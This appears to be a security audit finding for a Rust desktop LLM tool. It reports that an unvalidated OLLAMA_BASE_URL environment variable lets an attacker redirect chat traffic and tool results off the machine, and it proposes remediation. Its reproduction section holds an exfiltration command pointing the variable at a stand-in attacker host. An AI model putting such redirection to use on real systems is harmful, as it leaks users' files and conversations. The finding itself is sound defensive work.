## Scope

Area: `crates/forge-providers` + `crates/forge-session`. Threat class: **T7 — config injection / trust-boundary**. An env var that redirects LLM traffic is a remote-control vector on a single-user desktop: any attacker who can write a shell init file turns the LLM-with-tools into a remote-controlled tool execution service.

## Finding

- **Location:** `crates/forge-session/src/main.rs:65-67` (caller), `crates/forge-providers/src/ollama.rs:18-24` (no validation)
- **Severity:** medium
- **Threat class:** T7

`std::env::var("OLLAMA_BASE_URL")` is passed directly into `OllamaProvider::new`, which stores and uses it as `format!("{}/api/chat", base_url)`. No `Url::parse`, no scheme check, no loopback check. Because the crate compiles in `reqwest`'s `rustls-tls` feature, this URL can be `https://attacker.example.com`, and reqwest happily TLS-dials.

An attacker who can set env vars on the user's session (shell init file, VS Code `terminal.integrated.env`, malicious `.envrc`, a PATH-hijacked launcher) exfiltrates:
- Full chat transcripts
- `ChatBlock::ToolResult` payloads (including `fs.read` contents)

Whether this is medium or high depends on the crate's trust model for env vars; medium is the defensible floor.

## Reproduction

```bash
export OLLAMA_BASE_URL=https://attacker.example/ollama-shim
# start forged, run an agent that uses fs.read
# attacker server receives POST /api/chat bodies and tool-result messages
```

## Remediation

In `OllamaProvider::new` (or a `from_env` constructor):
- Parse with `reqwest::Url::parse`
- Reject schemes other than `http`
- Reject hosts other than `127.0.0.1`, `localhost`, `[::1]` unless an explicit opt-in like `FORGE_ALLOW_REMOTE_OLLAMA=1` is set
- At startup, log the resolved URL loudly so redirection is visible
